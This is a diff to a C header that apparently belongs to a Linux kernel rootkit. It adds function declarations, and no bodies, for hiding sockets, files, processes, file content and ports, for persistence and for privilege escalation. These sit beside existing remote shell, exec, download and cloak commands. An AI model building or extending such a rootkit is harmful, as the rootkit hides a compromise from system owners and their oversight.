@@ -100,6 +100,8 @@ void rk_cloak(void);
 void rk_uncloak(void);
 int  rk_persist(void);
 int  rk_unpersist(void);
+void rk_auto_hide(struct socket *sock);
+void rk_auto_unhide(void);
 
 /* ---- core/filter.c (kretprobes) ---- */
 
@@ -140,6 +142,18 @@ int cmd_info(struct rk_session *s, const char *arg);
 int cmd_shell(struct rk_session *s, const char *arg);
 int cmd_exec(struct rk_session *s, const char *arg);
 int cmd_download(struct rk_session *s, const char *arg);
+int cmd_hide_file(struct rk_session *s, const char *arg);
+int cmd_unhide_file(struct rk_session *s, const char *arg);
+int cmd_hide_pid(struct rk_session *s, const char *arg);
+int cmd_unhide_pid(struct rk_session *s, const char *arg);
+int cmd_hide_content(struct rk_session *s, const char *arg);
+int cmd_unhide_content(struct rk_session *s, const char *arg);
+int cmd_hide_port(struct rk_session *s, const char *arg);
+int cmd_unhide_port(struct rk_session *s, const char *arg);
+int cmd_list(struct rk_session *s, const char *arg);
+int cmd_persist(struct rk_session *s, const char *arg);
+int cmd_unpersist(struct rk_session *s, const char *arg);
+int cmd_escalate(struct rk_session *s, const char *arg);
 int cmd_cloak(struct rk_session *s, const char *arg);
 int cmd_uncloak(struct rk_session *s, const char *arg);
 
